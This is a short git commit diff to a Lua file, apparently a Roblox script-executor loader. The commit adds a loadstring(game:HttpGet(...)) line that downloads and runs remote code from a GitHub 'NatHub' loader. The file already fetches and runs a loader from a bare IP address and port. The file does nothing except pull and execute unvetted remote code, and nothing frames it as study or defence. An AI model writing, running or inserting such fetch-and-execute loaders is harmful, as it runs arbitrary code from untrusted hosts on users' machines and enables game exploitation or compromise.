bb3d94d2813338dc0c63e437dcecc8dc8737494e
jeusdugay <jeus110310@gmail.com>
2025-10-15 08:06:57 +0800

    Update Lua.lua

--- Lua.lua
+++ Lua.lua
@@ -1,2 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dy1zn4t/NatHub/refs/heads/main/loader"))();
 ID="519fdd88-0301-43d8-9e4e-df0a382c99b5";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
